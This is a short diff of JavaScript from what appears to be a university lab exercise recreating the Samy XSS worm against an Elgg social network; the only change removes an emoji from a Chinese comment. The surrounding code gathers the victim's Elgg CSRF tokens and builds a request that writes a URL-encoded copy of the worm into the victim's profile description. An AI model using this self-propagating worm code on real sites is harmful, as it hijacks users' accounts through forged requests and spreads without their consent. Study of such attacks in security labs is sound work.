@@ -14,7 +14,7 @@ window.onload = function() {
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "__elgg_token=" + elgg.security.token.__elgg_token;
 
-    // 原本的文字 + URL編碼後的蠕蟲腳本 + 權限參數 🔥
+    // 原本的文字 + URL編碼後的蠕蟲腳本 + 權限參數
     var content = token + ts + userName + "&description=samyLoveNTNU" + wormCode + "&accesslevel[description]=2" + guid;
     
     var samyGuid = 59;
